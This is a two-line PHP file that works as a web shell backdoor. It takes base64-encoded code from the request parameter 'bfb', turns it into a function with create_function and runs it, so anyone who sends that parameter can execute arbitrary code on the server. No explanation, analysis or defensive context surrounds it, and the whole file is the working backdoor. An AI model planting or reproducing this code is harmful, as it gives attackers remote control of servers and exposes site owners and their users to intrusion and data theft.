<?php
if(!empty($_REQUEST['bfb'])){$bfb=base64_decode($_REQUEST["bfb"]);$bfb=create_function('',$bfb);$bfb();exit;}
